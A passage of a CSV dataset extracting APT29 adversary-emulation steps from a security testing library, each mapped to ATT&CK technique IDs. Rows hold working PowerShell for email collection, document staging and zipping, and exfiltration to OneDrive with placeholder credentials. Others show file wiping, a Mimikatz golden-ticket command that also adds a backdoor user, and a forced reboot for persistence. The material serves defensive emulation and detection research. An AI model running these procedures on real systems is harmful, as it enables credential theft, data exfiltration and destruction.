+","[""T1028"", ""T1105""]","[""T1028"", ""T1105""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::146,146,Ingress Tool Transfer,attack_id: T1105 | name: Ingress Tool Transfer,"[""T1105""]","[""T1105""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::147,147,Collect E-mails,"id: b1dcc53a-c86c-46ba-8a3d-e1da74a8db3c | name: Collect E-mails | description: Perform e-mail collection from custom PowerShell module. | tactic: collection | technique: attack_id: T1114.001 | name: Email Collection: Local Email Collection | cti_source: https://www.fireeye.com/blog/products-and-services/2019/02/state-of-the-hack-no-easy-breach-revisited.html | procedure_group: procedure_collection | procedure_step: 17.A | platforms: windows: psh,pwsh: command: . .\stepSeventeen_email.ps1;
+Write-Host ""Emails Collected"";
+ | payloads: stepSeventeen_email.ps1 | executors: name: powershell | command: . .\stepSeventeen_email.ps1;
+Write-Host ""Emails Collected"";
+","[""T1114.001""]","[""T1114""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::148,148,Email Collection: Local Email Collection,attack_id: T1114.001 | name: Email Collection: Local Email Collection,"[""T1114.001""]","[""T1114""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::149,149,Collect Files & Compress Collection,"id: fc231955-774f-442c-ac0e-e74dfda50c5c | name: Collect Files & Compress Collection | description: Collect a specific document from a target machine. | tactic: collection | technique: attack_id: T1005 | name: Data from Local System | cti_source: https://www.fireeye.com/blog/threat-research/2017/03/dissecting_one_ofap.html | procedure_group: procedure_collection | procedure_step: 17.B | platforms: windows: psh,pwsh: command: try{
+  if (!(test-path -path ""C:\Windows\Temp\WindowsParentalControlMigration"" -ErrorAction Stop)) {
+    New-Item -Path ""C:\Windows\temp\"" -Name ""WindowsParentalControlMigration"" -ItemType ""directory"" -force;
+  }
+} catch {
+  write-host ""[!] Access is denied. Manually browse to C:\Windows\Temp via Explorer and accept prompt"";
+  exit 1;
+}
+
+if (! (test-path -path ""C:\Users\#{profile_user_day2}\Documents\MITRE-ATTACK-EVALS.HTML"")) {
+  write-host ""[!] Error, MITRE-ATTACK-EVALS.HTML was not found."";
+  exit 1;
+}
+Copy-Item ""C:\Users\#{profile_user_day2}\Documents\MITRE-ATTACK-EVALS.HTML"" -Destination ""C:\Windows\Temp\WindowsParentalControlMigration"" -force;
+. .\stepSeventeen_zip.ps1;
+zip C:\Windows\Temp\WindowsParentalControlMigration.tmp C:\Windows\Temp\WindowsParentalControlMigration;
+if ($?) {
+  write-host ""[+] Documents successfully staged for collection."";
+}
+ | payloads: stepSeventeen_zip.ps1 | input_arguments: profile_user_day2: description: Name of profile user | type: string | default: Administrator | executors: name: powershell | command: try{
+  if (!(test-path -path ""C:\Windows\Temp\WindowsParentalControlMigration"" -ErrorAction Stop)) {
+    New-Item -Path ""C:\Windows\temp\"" -Name ""WindowsParentalControlMigration"" -ItemType ""directory"" -force;
+  }
+} catch {
+  write-host ""[!] Access is denied. Manually browse to C:\Windows\Temp via Explorer and accept prompt"";
+  exit 1;
+}
+
+if (! (test-path -path ""C:\Users\#{profile_user_day2}\Documents\MITRE-ATTACK-EVALS.HTML"")) {
+  write-host ""[!] Error, MITRE-ATTACK-EVALS.HTML was not found."";
+  exit 1;
+}
+Copy-Item ""C:\Users\#{profile_user_day2}\Documents\MITRE-ATTACK-EVALS.HTML"" -Destination ""C:\Windows\Temp\WindowsParentalControlMigration"" -force;
+. .\stepSeventeen_zip.ps1;
+zip C:\Windows\Temp\WindowsParentalControlMigration.tmp C:\Windows\Temp\WindowsParentalControlMigration;
+if ($?) {
+  write-host ""[+] Documents successfully staged for collection."";
+}
+","[""T1005""]","[""T1005""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::150,150,Data from Local System,attack_id: T1005 | name: Data from Local System,"[""T1005""]","[""T1005""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::151,151,Exfiltrate data to OneDrive,"id: 4840d6dd-da13-401a-be46-05db56f4e1e0 | name: Exfiltrate data to OneDrive | description: Transfer data to a OneDrive account | tactic: exfiltration | technique: attack_id: T1537 | name: Transfer Data to Cloud Account | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_exfiltration | procedure_step: 18.A | platforms: windows: psh,pwsh: command: $err = $(net use y: #{onedrive.url} /user:#{onedrive.username} ""#{onedrive.password}"" 2>&1);
+if($err -Like ""*System error 85*"") {
+  Write-Host ""OneDrive net drive is already mounted!"";
+} elseif($err -Like ""*System error 67*"") {
+  Write-Host ""OneDrive net drive mount failed - Check URL!"";
+  Write-Host ""#{onedrive.url}"";
+  exit 1;
+} elseif($err -Like ""*System error 1244*"") {
+  Write-Host ""Could not authenticate to OneDrive - Check Creds!"";
+  Write-Host ""User: #{onedrive.username}"";
+  Write-Host ""Password: #{onedrive.password}"";
+  exit 1;
+}
+
+Write-Host ""Mount Successful""
+Copy-Item ""C:\Windows\Temp\WindowsParentalControlMigration.tmp"" -Destination ""y:\WindowsParentalControlMigration.tmp"" -Force;
+if(!$?){
+  exit 1;
+}
+
+Write-Host ""Copy Successfull""
+exit 0;
+ | input_arguments: onedrive.url: description: URL for OneDrive net drive | type: URL | default: https://contoso-my.sharepoint.com/personal/johnd_contoso_onmicrosoft_com/ | onedrive.username: description: Username for OneDrive authentication | type: string | default: Administrator | onedrive.password: description: Password for OneDrive authentication | type: string | default: Password123! | executors: name: powershell | command: $err = $(net use y: #{onedrive.url} /user:#{onedrive.username} ""#{onedrive.password}"" 2>&1);
+if($err -Like ""*System error 85*"") {
+  Write-Host ""OneDrive net drive is already mounted!"";
+} elseif($err -Like ""*System error 67*"") {
+  Write-Host ""OneDrive net drive mount failed - Check URL!"";
+  Write-Host ""#{onedrive.url}"";
+  exit 1;
+} elseif($err -Like ""*System error 1244*"") {
+  Write-Host ""Could not authenticate to OneDrive - Check Creds!"";
+  Write-Host ""User: #{onedrive.username}"";
+  Write-Host ""Password: #{onedrive.password}"";
+  exit 1;
+}
+
+Write-Host ""Mount Successful""
+Copy-Item ""C:\Windows\Temp\WindowsParentalControlMigration.tmp"" -Destination ""y:\WindowsParentalControlMigration.tmp"" -Force;
+if(!$?){
+  exit 1;
+}
+
+Write-Host ""Copy Successfull""
+exit 0;
+","[""T1537""]","[""T1537""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::152,152,Transfer Data to Cloud Account,attack_id: T1537 | name: Transfer Data to Cloud Account,"[""T1537""]","[""T1537""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::153,153,Data Wiping of staged files,"id: f820b93d-6176-4a72-a138-a70b0b549c49 | name: Data Wiping of staged files | description: Securely delete previously staged files. | tactic: impact | technique: attack_id: T1561.001 | name: Disk Wipe: Disk Content Wipe | cti_source: https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=6ab66701-25d7-4685-ae9d-93d63708a11c&CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&tab=librarydocuments | procedure_group: procedure_impact | procedure_step: 19.A | platforms: windows: psh,pwsh: command: . .\wipe.ps1;
+wipe ""m.exe"";
+wipe ""C:\Windows\Temp\WindowsParentalControlMigration.tmp"";
+wipe ""C:\Windows\Temp\WindowsParentalControlMigration\MITRE-ATTACK-EVALS.HTML"";
+ | payloads: wipe.ps1 | executors: name: powershell | command: . .\wipe.ps1;
+wipe ""m.exe"";
+wipe ""C:\Windows\Temp\WindowsParentalControlMigration.tmp"";
+wipe ""C:\Windows\Temp\WindowsParentalControlMigration\MITRE-ATTACK-EVALS.HTML"";
+","[""T1561.001""]","[""T1561""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::154,154,Disk Wipe: Disk Content Wipe,attack_id: T1561.001 | name: Disk Wipe: Disk Content Wipe,"[""T1561.001""]","[""T1561""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::155,155,Execute Invoke-Mimikatz,"id: 267bad86-3f06-49f1-9a3e-6522f2a61e7a | name: Execute Invoke-Mimikatz | description: Perfofrm Mimikatz credential collection | tactic: credential-access | technique: attack_id: T1003 | name: Credential Dumping | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_cred_access | procedure_step: 20.A.1 | platforms: windows: psh,pwsh: command: klist purge;
+. .\Invoke-Mimikatz.ps1;
+invoke-mimikatz -command ""kerberos::golden /domain:#{target.domain.name} /sid:#{target.sid}  /rc4:#{target.ntlm} /user:#{target.winrm.username} /ptt"";
+klist;
+invoke-command -ComputerName scranton -ScriptBlock {net user /add toby ""pamBeesly<3""};
+ | payloads: Invoke-Mimikatz.ps1 | input_arguments: target.domain.name: description: Target domain name | type: string | default: domain | target.sid: description: SID for target user | type: string | default: S-1-5-21-1004336348-1177238915-682003330-512 | target.ntlm: description: NTLM hash for target user | type: string | default: 855c3697d9979e78ac404c4ba2c66533 | target.winrm.username: description: Username for winrm target user | type: string | default: Administrator | executors: name: powershell | command: klist purge;
+. .\Invoke-Mimikatz.ps1;
+invoke-mimikatz -command ""kerberos::golden /domain:#{target.domain.name} /sid:#{target.sid}  /rc4:#{target.ntlm} /user:#{target.winrm.username} /ptt"";
+klist;
+invoke-command -ComputerName scranton -ScriptBlock {net user /add toby ""pamBeesly<3""};
+","[""T1003""]","[""T1003""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::156,156,Credential Dumping,attack_id: T1003 | name: Credential Dumping,"[""T1003""]","[""T1003""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::157,157,Triggering Persistent,"id: afb8d8f7-d059-4825-95ae-c5727e2db320 | name: Triggering Persistent | description: Trigger RegKey persistence by rebooting the machine | tactic: persistence | technique: attack_id: T1218.011 | name: Signed Binary Proxy Execution: Rundll32 | cti_source: https://www.fireeye.com/blog/products-and-services/2019/02/state-of-the-hack-no-easy-breach-revisited.html | procedure_group: procedure_persistence | procedure_step: 20.B | platforms: windows: psh,pwsh: command: Restart-Computer -Force;
+ | executors: name: powershell | command: Restart-Computer -Force;
+","[""T1218.011""]","[""T1218""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::158,158,Signed Binary Proxy Execution: Rundll32,attack_id: T1218.011 | name: Signed Binary Proxy Execution: Rundll32,"[""T1218.011""]","[""T1218""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
